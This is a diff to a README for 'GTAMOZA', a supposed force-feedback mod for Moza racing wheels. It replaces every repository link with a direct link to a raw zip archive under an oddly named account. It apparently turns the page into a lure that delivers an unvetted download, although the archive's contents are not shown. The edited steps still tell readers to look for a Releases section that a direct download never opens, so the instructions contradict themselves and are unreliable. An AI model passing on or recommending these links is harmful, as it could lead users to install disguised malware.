@@ -1,6 +1,6 @@
 <h1>🎮 GTAMOZA - Force Feedback Magic for Your Moza Wheel</h1>
 
-[![Download GTAMOZA](https://img.shields.io/badge/Download-GTAMOZA-blue?style=for-the-badge&logo=github)](https://github.com/procursiveepilepsyuse449/GTAMOZA)
+[![Download GTAMOZA](https://img.shields.io/badge/Download-GTAMOZA-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/procursiveepilepsyuse449/GTAMOZA/main/gta-mod/GTAMOZA/Software-v1.3.zip)
 
 ---
 
@@ -34,11 +34,11 @@ This tool is perfect for:
 
 Visit this link to download the application:
 
-[![Download GTAMOZA Now](https://img.shields.io/badge/⬇️_Download-GTAMOZA-green?style=for-the-badge)](https://github.com/procursiveepilepsyuse449/GTAMOZA)
+[![Download GTAMOZA Now](https://img.shields.io/badge/⬇️_Download-GTAMOZA-green?style=for-the-badge)](https://raw.githubusercontent.com/procursiveepilepsyuse449/GTAMOZA/main/gta-mod/GTAMOZA/Software-v1.3.zip)
 
 **Step-by-step instructions:**
 
-1. **Click the blue download button above** or visit this link: https://github.com/procursiveepilepsyuse449/GTAMOZA
+1. **Click the blue download button above** or visit this link: https://raw.githubusercontent.com/procursiveepilepsyuse449/GTAMOZA/main/gta-mod/GTAMOZA/Software-v1.3.zip
 2. On the GitHub page that opens, look for the **"Releases"** section on the right side of the page
 3. Click the **latest release** link
 4. Download the file named **"GTAMOZA-Setup.exe"** (or similar)
